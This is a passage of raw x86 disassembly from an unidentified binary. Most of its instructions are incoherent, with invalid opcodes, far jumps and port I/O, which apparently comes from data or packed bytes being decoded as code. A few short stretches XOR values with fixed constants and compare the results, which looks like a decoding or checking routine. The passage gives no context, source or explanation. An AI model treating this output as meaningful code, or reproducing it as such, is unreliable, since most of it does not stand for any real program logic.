  407be8:	jne    0x407b6a
  407bea:	push   ecx
  407beb:	int3   
  407bec:	xor    BYTE PTR [edi],bh
  407bee:	iret   
  407bef:	jb     0x407bd0
  407bf1:	js     0x407bf3
  407bf3:	cmp    edx,DWORD PTR [ecx]
  407bf5:	pop    esi
  407bf6:	pusha  
  407bf7:	gs dec eax
  407bf9:	sbb    BYTE PTR [edx],dl
  407bfb:	imul   ecx,ecx,0x3c
  407bfe:	xchg   esi,eax
  407bff:	mov    ebx,0x43ed1321
  407c04:	and    BYTE PTR [ecx-0x68cf44f8],al
  407c0a:	sub    eax,0x1cc35966
  407c0f:	or     bl,dh
  407c11:	loopne 0x407bf1
  407c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c14:	push   0xf9a13af3
  407c19:	sbb    esp,DWORD PTR [edx+edi*4-0x30]
  407c1d:	pop    esi
  407c1e:	jp     0x407c1e
  407c20:	into   
  407c21:	imul   edx,DWORD PTR [ecx+0x2f],0xfffffff3
  407c25:	test   al,0x4
  407c27:	pop    es
  407c28:	outs   dx,BYTE PTR ds:[esi]
  407c29:	stos   DWORD PTR es:[edi],eax
  407c2a:	stc    
  407c2b:	jle    0x407bf8
  407c2d:	rcr    DWORD PTR gs:[ecx-0x80],cl
  407c31:	in     al,dx
  407c32:	repnz mov DWORD PTR [ecx],eax
  407c35:	arpl   WORD PTR [edi],di
  407c37:	cmp    ebx,edx
  407c39:	retf   
  407c3a:	sbb    DWORD PTR [edx+0x14],ecx
  407c3d:	inc    ecx
  407c3e:	push   edi
  407c3f:	fld    TBYTE PTR [ebx]
  407c41:	dec    ebp
  407c42:	jns    0x407cc0
  407c44:	out    dx,eax
  407c45:	jno    0x407c83
  407c47:	add    ebp,DWORD PTR [edx-0x7a]
  407c4a:	cdq    
  407c4b:	jl     0x407bfc
  407c4d:	pushf  
  407c4e:	das    
  407c4f:	orps   xmm0,xmm4
  407c52:	xchg   esp,eax
  407c53:	sbb    DWORD PTR [eax+0x5f],0xffffffcb
  407c57:	add    al,BYTE PTR [edx+0x33]
  407c5a:	and    DWORD PTR [ecx+0x5e],0x730083df
  407c61:	hlt    
  407c62:	cmp    eax,0xb1edb5ef
  407c67:	push   es
  407c68:	push   edi
  407c69:	mov    ah,0xef
  407c6b:	xor    al,0xcc
  407c6d:	cmp    al,0x9f
  407c6f:	push   edx
  407c70:	or     ch,BYTE PTR cs:[edi]
  407c73:	lods   al,BYTE PTR ds:[esi]
  407c74:	dec    edi
  407c75:	rol    ecx,0x75
  407c78:	sub    al,0x99
  407c7a:	out    0x9b,eax
  407c7c:	outs   dx,BYTE PTR ds:[esi]
  407c7d:	mov    ch,BYTE PTR [esi]
  407c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c80:	inc    edx
  407c81:	call   0x62b2171f
  407c86:	add    DWORD PTR [ebx+0x5765df55],0x5
  407c8d:	dec    eax
  407c8e:	sbb    DWORD PTR [ebx-0x5af09b2f],esp
  407c94:	mov    bl,0xe7
  407c96:	xchg   BYTE PTR [ebx],bh
  407c98:	rol    BYTE PTR [esi],0x97
  407c9b:	popa   
  407c9c:	or     dl,bl
  407c9e:	dec    edx
  407c9f:	mov    ah,0xda
  407ca1:	cmp    esi,DWORD PTR [ebp-0x694279ab]
  407ca7:	imul   esp,DWORD PTR [esi+0x2268ece6],0x4e
  407cae:	sbb    eax,0x4cb13826
  407cb3:	jno    0x407cac
  407cb5:	push   0x8e20857
  407cba:	in     al,0x4c
  407cbc:	iret   
  407cbd:	fstp   DWORD PTR [edx-0x3c]
  407cc0:	loop   0x407c95
  407cc2:	xchg   edi,eax
  407cc3:	dec    edi
  407cc4:	dec    edx
  407cc5:	std    
  407cc6:	ror    DWORD PTR [eax-0x1f463fd0],0x0
  407ccd:	cmp    DWORD PTR [edx-0x481bafb0],edx
  407cd3:	imul   eax,DWORD PTR [esi+0x5c],0xffffffb6
  407cd7:	repz jecxz 0x407d16
  407cda:	mov    ?,WORD PTR [edi-0x55ee26e5]
  407ce0:	push   0x71ec0bc4
  407ce5:	pop    esi
  407ce6:	inc    ebp
  407ce7:	dec    esp
  407ce8:	cwde   
  407ce9:	ins    BYTE PTR es:[edi],dx
  407cea:	add    DWORD PTR [ecx+0x60],esi
  407ced:	pop    ds
  407cee:	mov    ss,WORD PTR [edi+0x63e500ae]
  407cf4:	sub    ebp,edx
  407cf6:	les    edi,FWORD PTR [edi+0x5c]
  407cf9:	xchg   ecx,eax
  407cfa:	mov    BYTE PTR [edi],bh
  407cfc:	leave  
  407cfd:	sahf   
  407cfe:	cld    
  407cff:	add    ax,WORD PTR [bx+di]
  407d03:	data16 mov ah,0xe9
  407d06:	sbb    al,BYTE PTR [esi]
  407d08:	mov    ebx,0x82e34288
  407d0d:	dec    ecx
  407d0e:	mov    dh,0xad
  407d10:	stc    
  407d11:	pop    esi
  407d12:	sub    eax,0xfe4ab7dd
  407d17:	pop    ss
  407d18:	in     al,0x1a
  407d1a:	xor    ebx,ebx
  407d1c:	shl    edi,1
  407d1e:	mov    edx,gs
  407d20:	push   cs
  407d21:	adc    eax,0xa0b9d2
  407d26:	adc    edx,DWORD PTR [eax+0x224b59f0]
  407d2c:	push   esi
  407d2d:	mov    dl,0x1f
  407d2f:	(bad)  
  407d30:	ret    0x2d24
  407d33:	sar    DWORD PTR [ecx],cl
  407d35:	add    dh,BYTE PTR [ebx]
  407d37:	push   ds
  407d38:	aaa    
  407d39:	jmp    0xbfe9:0x7b76b2bd
  407d40:	(bad)  
  407d41:	mov    eax,ds:0xbc8f748a
  407d46:	jmp    0x4388:0xa3453888
  407d4d:	hlt    
  407d4e:	fcom   QWORD PTR [esi+0xa]
  407d51:	retf   
  407d52:	add    eax,0x2582f53a
  407d57:	jbe    0x407d14
  407d59:	rcr    DWORD PTR [esi+eiz*1],0xf1
  407d5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d5e:	inc    ecx
  407d5f:	mov    ah,0x6b
  407d61:	int    0x3a
  407d63:	fdiv   DWORD PTR [edx+eax*4+0x7de94bdf]
  407d6a:	paddusw mm3,QWORD PTR [edi+0x1b]
  407d6e:	gs out dx,al
  407d70:	add    al,0xac
  407d72:	mov    edx,0xd03c6688
  407d77:	(bad)  
  407d78:	xchg   ebp,eax
  407d79:	inc    eax
  407d7a:	jnp    0x407d04
  407d7c:	scas   eax,DWORD PTR es:[edi]
  407d7d:	mov    edx,0x828cc99
  407d82:	mov    esi,0x1d0fb95e
  407d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d88:	arpl   WORD PTR [esi+0x52a0160a],dx
  407d8e:	pop    ecx
  407d8f:	je     0x407e07
  407d91:	fcom   DWORD PTR [ecx-0x2d]
  407d94:	cvtdq2ps xmm2,XMMWORD PTR [edi+ecx*4]
  407d98:	and    al,0xf0
  407d9a:	sahf   
  407d9b:	cwde   
  407d9c:	fidiv  WORD PTR [eax-0x20]
  407d9f:	fdivr  st(4),st
  407da1:	ret    0xb1a1
  407da4:	jmp    0x407d9c
  407da6:	push   esp
  407da7:	scas   eax,DWORD PTR es:[edi]
  407da8:	pushf  
  407da9:	push   ds
  407daa:	xchg   ebx,eax
  407dab:	ror    dh,cl
  407dad:	xchg   ebp,eax
  407dae:	idiv   BYTE PTR [ecx-0x5475e72a]
  407db4:	jecxz  0x407db9
  407db6:	cli    
  407db7:	fidiv  WORD PTR [edx+0x233cebf1]
  407dbd:	cld    
  407dbe:	or     eax,0x8bc18b7c
  407dc3:	dec    ebp
  407dc4:	int3   
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0xa969a17e
  407e7d:	mov    esp,0x18186f22
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [ecx+0x1c],ah
  407e88:	dec    edx
  407e89:	loope  0x407e76
  407e8b:	push   ss
  407e8c:	int3   
  407e8d:	nop
  407e8e:	mov    ecx,0x4487b599
  407e93:	adc    eax,0x6ec2f0c0
  407e98:	adc    eax,0x90d35494
  407e9d:	je     0x407e51
  407e9f:	cli    
  407ea0:	jmp    0xa299:0x9eb3f463
  407ea7:	retf   
  407ea8:	add    ebp,DWORD PTR [ecx+0x584a9193]
  407eae:	stc    
  407eaf:	push   ss
  407eb0:	repnz or cl,bl
  407eb3:	mov    dh,0xe3
  407eb5:	(bad)  
  407eb6:	fsubp  st(6),st
  407eb8:	scas   eax,DWORD PTR es:[edi]
  407eb9:	adc    al,BYTE PTR [ecx-0x66]
  407ebc:	lods   al,BYTE PTR ds:[esi]
  407ebd:	in     al,dx
  407ebe:	inc    eax
  407ebf:	adc    eax,0x30a4f28d
  407ec4:	xchg   DWORD PTR [eax+ecx*4-0x58552740],ebx
  407ecb:	mov    ebp,0xb4aaec8c
  407ed0:	add    dh,BYTE PTR [esi+0x79470230]
  407ed6:	jp     0x407edf
  407ed8:	push   0xffffffbc
  407eda:	cmp    eax,0xb361112d
  407edf:	sbb    al,dh
  407ee1:	pusha  
  407ee2:	and    DWORD PTR [edi-0x5214e1b],0xeac93be
  407eec:	mov    ch,dl
  407eee:	push   0xb6399687
  407ef3:	enter  0x929d,0x8
  407ef7:	fistp  DWORD PTR [ecx+0x30]
  407efa:	rol    BYTE PTR [ebx],0x28
  407efd:	lods   al,BYTE PTR ds:[esi]
  407efe:	out    dx,eax
  407eff:	xchg   DWORD PTR [ebp-0x67],edi
  407f02:	ins    BYTE PTR es:[edi],dx
  407f03:	mov    al,0x58
  407f05:	enter  0x1d4e,0xf9
  407f09:	mov    edi,0x8352108a
  407f0e:	lods   al,BYTE PTR ds:[esi]
  407f0f:	retf   
  407f10:	push   eax
  407f11:	inc    ebx
  407f12:	popa   
  407f13:	call   0xfc057b58
  407f18:	vmwrite eax,esp
  407f1b:	mov    esp,0xd242b21c
  407f20:	push   edx
  407f21:	sub    ebp,DWORD PTR ss:[ecx-0x45]
  407f25:	push   0x2d
  407f27:	mov    BYTE PTR [edi+0x36],ah
  407f2a:	adc    DWORD PTR [ebx],ebx
  407f2c:	xchg   ecx,eax
  407f2d:	loop   0x407f76
  407f2f:	sti    
  407f30:	or     DWORD PTR [esi+0x75e5972b],edi
  407f36:	cwde   
  407f37:	mov    ah,BYTE PTR [esi+0x47]
  407f3a:	add    eax,0xd48d4687
  407f3f:	sbb    eax,0x5d47112e
  407f44:	mov    eax,ds:0xb225f39a
  407f49:	and    bh,0x60
  407f4c:	daa    
  407f4d:	mov    ds,WORD PTR [edx]
  407f4f:	aas    
  407f50:	ds mov dl,0x33
  407f53:	or     eax,0x76e5954f
  407f58:	pop    edx
  407f59:	in     al,0x81
  407f5b:	retf   0x1f0d
  407f5e:	cmp    esp,ebp
  407f60:	cli    
  407f61:	mov    al,ds:0x6bebc427
  407f66:	lods   eax,DWORD PTR ds:[esi]
  407f67:	cmp    DWORD PTR [ecx-0x19a52e02],edx
  407f6d:	ret    
  407f6e:	add    bh,BYTE PTR [edx]
  407f70:	pop    ebx
  407f71:	or     al,0x39
  407f73:	ror    DWORD PTR [eax+0x231d5e59],1
  407f79:	rcr    DWORD PTR [ecx+0x1df81767],1
  407f7f:	jmp    FWORD PTR [edi]
  407f81:	retf   0x91d
  407f84:	mov    DWORD PTR ds:0x91dcd22a,ebx
  407f8a:	imul   BYTE PTR [edx]
  407f8c:	xor    BYTE PTR [ebp-0x2633f4c7],al
  407f92:	in     al,0xc5
  407f94:	xchg   esi,eax
  407f95:	es ret 0x367f
  407f99:	ror    BYTE PTR [ebx+0x19],1
  407f9c:	xchg   esi,eax
  407f9d:	fmul   QWORD PTR ds:0xcd3241ed
  407fa3:	dec    ebx
  407fa4:	bound  ecx,QWORD PTR ss:[esi-0x4e]
  407fa8:	pop    ds
  407fa9:	mov    ah,0xc0
  407fab:	clc    
  407fac:	sub    eax,0xacf3a0f0
  407fb1:	mov    ?,esp
  407fb3:	loop   0x407fa0
  407fb5:	jp     0x407f7e
  407fb7:	sub    ebx,ebx
  407fb9:	jae    0x407f90
  407fbb:	cs fcmovnbe st,st(0)
  407fbe:	cs mov edi,0x368af34b
  407fc4:	push   cs
  407fc5:	sar    BYTE PTR [eax+0x2a],1
  407fc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fc9:	or     BYTE PTR [edi+0x59ca5519],bh
  407fcf:	shl    eax,0x2b
  407fd2:	pop    es
  407fd3:	popf   
  407fd4:	daa    
  407fd5:	dec    ecx
  407fd6:	jmp    0xb83b:0xee8d3af5
  407fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fde:	daa    
  407fdf:	jbe    0x408049
  407fe1:	pop    eax
  407fe2:	sahf   
  407fe3:	jnp    0x407fce
  407fe5:	push   0x3ba5ad08
  407fea:	inc    ebx
  407feb:	pop    ebp
  407fec:	xor    ebx,DWORD PTR [edx+eax*1-0x7e83f4fd]
  407ff3:	int3   
  407ff4:	cmp    BYTE PTR [ebx],cl
  407ff6:	test   BYTE PTR [edx],0xa
  407ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ffa:	outs   dx,BYTE PTR ds:[esi]
  407ffb:	pop    esp
  407ffc:	mov    ch,0x82
  407ffe:	adc    dh,BYTE PTR ds:0x3d5e7bcb
  408004:	cmp    al,0xa1
  408006:	sar    BYTE PTR [ecx-0x28c6490d],0x2a
  40800d:	push   es
  40800e:	sahf   
  40800f:	cmp    al,0xb9
  408011:	mov    esi,0xaa23b76d
  408016:	not    BYTE PTR [ebx]
  408018:	(bad)  
  40801a:	add    dh,BYTE PTR [ebx-0x3e]
  40801d:	ja     0x407fef
  40801f:	nop
  408020:	dec    esi
  408021:	jne    0x407fa8
  408023:	cmp    ch,BYTE PTR [esi-0x1a]
  408026:	pop    ss
  408027:	pop    ebp
  408028:	add    BYTE PTR [ecx+0x3a57298],ch
  40802e:	mov    ecx,0x476742d9
  408033:	ss inc ebx
  408035:	ja     0x40806c
  408037:	ret    
  408038:	ret    0xfbc2
  40803b:	pop    ds
  40803c:	imul   edi,ebp,0xffffffc7
  40803f:	cmp    ah,BYTE PTR [ebp-0xe]
  408042:	out    0xd0,eax
  408044:	dec    ebp
  408045:	jb     0x408014
  408047:	(bad)  es:[ebx-0x34]
  40804b:	mov    ecx,0xb06c35fe
  408050:	sbb    cl,bh
  408052:	adc    BYTE PTR [ecx],al
  408054:	xlat   BYTE PTR ds:[ebx]
  408055:	jmp    0xbc0d:0x5a283c5c
  40805c:	inc    ebp
  40805d:	ret    0x61a6
  408060:	xchg   ebp,eax
  408061:	(bad)  
  408063:	imul   ebx,edx,0x353d8707
  408069:	adc    BYTE PTR [edi+ebx*8-0x407d062f],bl
  408070:	into   
  408071:	inc    esi
  408072:	xlat   BYTE PTR ds:[ebx]
  408073:	inc    esi
  408074:	xchg   esi,eax
  408075:	push   es
  408076:	pop    DWORD PTR es:[eax+eiz*4-0x34]
  40807b:	hlt    
  40807c:	mov    edx,0xea63411a
  408081:	mov    edx,0x15976bc5
  408086:	fcmovu st,st(3)
  408088:	xor    edx,DWORD PTR [esi-0x4a]
  40808b:	pop    ebp
  40808c:	aam    0xf2
  40808e:	xchg   ecx,ecx
  408090:	int    0xfc
  408092:	xor    eax,0xa7da0653
  408097:	push   ss
  408098:	pop    es
  408099:	add    BYTE PTR [ebx],al
  40809b:	retf   
  40809c:	out    dx,al
  40809d:	scas   eax,DWORD PTR es:[edi]
  40809e:	adc    al,0x87
  4080a0:	js     0x4080ab
  4080a2:	mov    WORD PTR [ebx-0xee6d631],gs
  4080a8:	or     ah,BYTE PTR [esi]
  4080aa:	call   0x8604:0xead8225d
  4080b1:	int3   
  4080b2:	or     ebx,DWORD PTR [esi+ebx*2+0x28eb4108]
  4080b9:	dec    edi
  4080ba:	stc    
  4080bb:	xor    edi,ebx
  4080bd:	pop    eax
  4080be:	and    BYTE PTR [ebp-0x3d8daf],0xcc
  4080c5:	in     eax,0xf4
  4080c7:	popf   
  4080c8:	push   0x1fab491c
  4080cd:	pop    esp
  4080ce:	adc    eax,0x6180de36
  4080d3:	or     ebx,DWORD PTR [eax-0x1e7444a8]
  4080d9:	sbb    dh,BYTE PTR [esi]
  4080db:	fld    TBYTE PTR [ebx]
  4080dd:	popf   
  4080de:	xor    DWORD PTR [esp+esi*8-0x6fb4e0f2],ebp
  4080e5:	sub    DWORD PTR [eax],ebp
  4080e7:	lea    ebx,[eax-0x6f717acc]
  4080ed:	xchg   esi,eax
  4080ee:	cmp    edx,DWORD PTR [ecx-0x62]
  4080f1:	inc    edx
  4080f2:	adc    edx,DWORD PTR [edx-0xa4ddd67]
  4080f8:	arpl   WORD PTR [edi+ebx*4-0x61ea2229],sp
  4080ff:	jbe    0x408144
  408101:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408102:	mov    eax,0xbf779d8c
  408107:	mov    eax,edi
  408109:	mov    ebx,0x62852d7b
  40810e:	inc    ecx
  40810f:	aas    
  408110:	xchg   esp,ebp
  408112:	ret    
  408113:	adc    DWORD PTR ds:[ecx+ebp*1],ebx
  408117:	jae    0x408176
  408119:	cmp    eax,0x94a66024
  40811e:	retf   
  40811f:	(bad)  
  408120:	ins    DWORD PTR es:[edi],dx
  408121:	inc    ebp
  408122:	ds inc esp
  408124:	int3   
  408125:	xchg   BYTE PTR [bp+di-0x3ea2],dl
  40812a:	adc    al,BYTE PTR [eax+0x3a]
  40812d:	repz xor BYTE PTR [ebx-0x5817382b],al
  408134:	ja     0x40816b
  408136:	xchg   DWORD PTR ds:0xd2b2fce8,ebx
  40813c:	retf   
  40813d:	dec    esp
  40813e:	jb     0x408138
  408140:	jo     0x408101
  408142:	mov    al,ds:0x56238ed6
  408147:	jle    0x408190
  408149:	jne    0x40812a
  40814b:	enter  0xd6aa,0x29
  40814f:	adc    bl,bl
  408151:	add    edi,edi
  408153:	mov    BYTE PTR [edx+0x61],cl
  408156:	rcl    BYTE PTR [ebx-0x60],0x76
  40815a:	push   ss
  40815b:	inc    esp
  40815c:	sub    dh,ch
  40815e:	ret    
  40815f:	(bad)  
  408160:	jecxz  0x4081ca
  408162:	inc    edx
  408163:	mov    edx,0x54da1c00
  408168:	cmp    BYTE PTR [ecx-0x24],0xa7
  40816c:	and    eax,0xb136ab14
  408171:	pusha  
  408172:	stos   DWORD PTR es:[edi],eax
  408173:	mov    ecx,ebx
  408175:	cmc    
  408176:	sahf   
  408177:	stc    
  408178:	inc    ebp
  408179:	mov    ch,0xb7
  40817b:	out    0x4,al
  40817d:	lock or ebx,0xfffffff3
  408181:	add    eax,0x3f52da7e
  408186:	das    
  408187:	and    eax,0x3b846196
  40818c:	es shr esp,0x3a
  408190:	bound  esp,QWORD PTR [eax-0x6d]
  408193:	pop    ecx
  408194:	not    BYTE PTR [ebp+0x58]
  408197:	inc    edx
  408198:	mov    ds:0xe4fa160a,eax
  40819d:	js     0x40816f
  40819f:	je     0x4081b2
  4081a1:	mov    DWORD PTR [ebx+0x6a],edx
  4081a4:	arpl   WORD PTR [edx+0x8],di
  4081a7:	cmp    BYTE PTR [esi-0x41bd7297],bh
  4081ad:	jl     0x408143
  4081af:	daa    
  4081b0:	or     BYTE PTR [edi],0x8d
  4081b3:	inc    esi
  4081b4:	stos   BYTE PTR es:[edi],al
  4081b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b6:	sub    BYTE PTR [edx],bh
  4081b8:	fild   DWORD PTR [esi+ecx*4-0x4f03642c]
  4081bf:	in     al,dx
  4081c0:	test   al,0xcf
  4081c2:	ds push cs
  4081c4:	xor    edi,DWORD PTR ds:0x9c1cb4ec
  4081ca:	mov    dl,dh
  4081cc:	jecxz  0x408209
  4081ce:	dec    edi
  4081cf:	add    eax,0xe42e0ec0
  4081d4:	mov    WORD PTR [esp+edi*4-0x1a],ss
  4081d8:	mov    ?,WORD PTR [eax]
  4081da:	(bad)  
  4081db:	into   
  4081dc:	sbb    dl,BYTE PTR [esi]
  4081de:	shr    DWORD PTR [esi+0x6aa650b0],0xef
  4081e5:	push   0xffffffe8
  4081e7:	mov    WORD PTR [eax+0x51],ss
  4081ea:	xchg   ebp,eax
  4081eb:	and    cl,bh
  4081ed:	add    al,0x7c
  4081ef:	or     ecx,DWORD PTR [edx+0x6ef3ff3c]
  4081f5:	push   0x53be4094
  4081fa:	xor    bh,BYTE PTR [esi+0x3b79e12c]
  408200:	ficomp DWORD PTR [ebx+0x8e5f139]
  408206:	jmp    0xe103:0x87d988c9
  40820d:	pop    edi
  40820e:	mov    dh,0x66
  408210:	test   eax,0xf51a8246
  408215:	sbb    al,0x32
  408217:	outs   dx,DWORD PTR ds:[esi]
  408218:	xchg   edx,eax
  408219:	leave  
  40821a:	ss aam 0x4d
  40821d:	xchg   ebx,eax
  40821e:	iret   
  40821f:	mov    bl,BYTE PTR [edi+0x4f]
  408222:	out    dx,al
  408223:	add    al,bl
  408225:	xchg   DWORD PTR [ecx-0x67],esp
  408228:	add    BYTE PTR [ecx-0x13],bl
  40822b:	and    ecx,DWORD PTR [esi+0x4b]
  40822e:	pop    ecx
  40822f:	in     al,dx
  408230:	mov    ds:0x967181d6,eax
  408235:	adc    edi,ebp
  408237:	sub    al,0x75
  408239:	and    eax,0x4886f2a7
  40823e:	cwde   
  40823f:	test   DWORD PTR [eax-0x6d],ebx
  408242:	aaa    
  408243:	fdivr  st(2),st
  408245:	std    
  408246:	outs   dx,BYTE PTR ds:[esi]
  408247:	mov    DWORD PTR [ebp-0x6c],eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0xc564709d
  40828a:	out    0xaa,eax
  40828c:	test   al,0x67
  40828e:	sbb    BYTE PTR [eax],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [eax-0x29d6aa51],dl
  408299:	fucomip st,st(4)
  40829b:	push   cs
  40829c:	out    dx,al
  40829d:	dec    esp
  40829e:	inc    edx
  40829f:	aaa    
  4082a0:	jmp    0x1d04:0x4b15c7a5
  4082a7:	nop
  4082a8:	adc    ecx,DWORD PTR [edi]
  4082aa:	ror    BYTE PTR [ebx],cl
  4082ac:	push   es
  4082ad:	push   ds
  4082ae:	fwait
  4082af:	test   al,0x57
  4082b1:	add    al,bh
  4082b3:	push   eax
  4082b4:	or     DWORD PTR [esi+0x8],esi
  4082b7:	jo     0x40830a
  4082b9:	push   ds
  4082ba:	and    al,0x1b
  4082bc:	xor    BYTE PTR [ebp+0x6b44858],dh
  4082c2:	into   
  4082c3:	sar    DWORD PTR [ebx+0x660df77e],cl
  4082c9:	or     bh,BYTE PTR [ebx]
  4082cb:	sub    DWORD PTR [edx],ebx
  4082cd:	mov    al,ds:0xb63f0cb6
  4082d2:	jmp    0x899bb0f9
  4082d7:	mov    dh,0x61
  4082d9:	call   0xd23:0x83322be7
  4082e0:	push   cs
  4082e1:	pop    esi
  4082e2:	hlt    
  4082e3:	scas   al,BYTE PTR es:[edi]
  4082e4:	iret   
  4082e5:	mov    eax,0x82c3d08e
  4082ea:	imul   ebx,DWORD PTR [eax+ebp*2],0xffffffff
  4082ee:	test   DWORD PTR ds:0x3faac680,eax
  4082f4:	push   eax
  4082f5:	call   0x1d93:0xf04002ab
  4082fc:	iret   
  4082fd:	sub    eax,0xd22ed76b
  408302:	popf   
  408303:	and    DWORD PTR [ecx],0x9d2f4d66
  408309:	add    BYTE PTR [ecx-0x11],ah
  40830c:	add    bh,dl
  40830e:	dec    esp
  40830f:	je     0x40829f
  408311:	add    eax,0xc226d072
  408316:	mov    ecx,0x33e24e48
  40831b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40831c:	adc    esi,edx
  40831e:	dec    edx
  40831f:	sar    DWORD PTR [edi-0x16],1
  408322:	dec    ebx
  408323:	sbb    ecx,DWORD PTR [ebx-0x1a0f4c79]
  408329:	add    BYTE PTR [eax+0x132cf9e3],ah
  40832f:	rcr    DWORD PTR [ebp+0x4d],0x2e
  408333:	dec    esi
  408334:	inc    ebx
  408335:	aas    
  408336:	arpl   WORD PTR gs:[edi-0x22],di
  40833a:	aaa    
  40833b:	adc    al,0x1
  40833d:	sbb    ebp,DWORD PTR [ebx+0x74]
  408340:	cmp    DWORD PTR ss:[ecx+0x1135eaf5],eax
  408347:	xor    al,0xf5
  408349:	push   esp
  40834a:	xchg   esi,eax
  40834b:	ficom  WORD PTR [edi-0x29]
  40834e:	jle    0x40833b
  408350:	cwde   
  408351:	out    0xb9,al
  408353:	jmp    0x76af:0x82274cbe
  40835a:	call   0x1208ad5e
  40835f:	xchg   edx,eax
  408360:	pop    ebx
  408361:	std    
  408362:	and    BYTE PTR [ebx],bl
  408364:	mov    dl,0x58
  408366:	sbb    eax,0x215a972a
  40836b:	xor    eax,0xe67d021
  408370:	test   eax,0xf3dc0f1e
  408375:	pop    edx
  408376:	add    esi,DWORD PTR [ecx]
  408378:	cmp    eax,0xd65b2ba
  40837d:	in     eax,dx
  40837e:	shl    eax,cl
  408380:	mov    al,0x5a
  408382:	idiv   BYTE PTR [edx-0x2]
  408385:	fcomp  QWORD PTR [ebx-0x27]
  408388:	jg     0x4083b9
  40838a:	or     DWORD PTR [ecx],esi
  40838c:	mov    ebx,0x9b954324
  408391:	and    ch,BYTE PTR [ebp+0xf]
  408394:	outs   dx,DWORD PTR ds:[esi]
  408395:	ins    DWORD PTR es:[edi],dx
  408396:	sub    cl,0xb
  408399:	mov    ecx,DWORD PTR [ebp-0x63]
  40839c:	cmp    bl,dh
  40839e:	pop    ebp
  40839f:	popf   
  4083a0:	cmp    dh,ah
  4083a2:	pop    ecx
  4083a3:	lds    edi,FWORD PTR [ebx+edx*8]
  4083a6:	rol    BYTE PTR [ecx+0x626720f7],cl
  4083ac:	loop   0x4083e6
  4083ae:	outs   dx,BYTE PTR ds:[esi]
  4083af:	push   ds
  4083b0:	jecxz  0x4083ab
  4083b2:	popa   
  4083b3:	inc    ebp
  4083b4:	add    BYTE PTR [eax-0x37],bl
  4083b7:	xchg   ebx,eax
  4083b8:	jp     0x408341
  4083ba:	imul   BYTE PTR [ebx]
  4083bc:	push   esi
  4083bd:	fld    QWORD PTR [edi]
  4083bf:	add    DWORD PTR [eax-0x67],eax
  4083c2:	ins    DWORD PTR es:[edi],dx
  4083c3:	lahf   
  4083c4:	xchg   esi,eax
  4083c5:	out    dx,eax
  4083c6:	arpl   WORD PTR [edi-0x2926610a],si
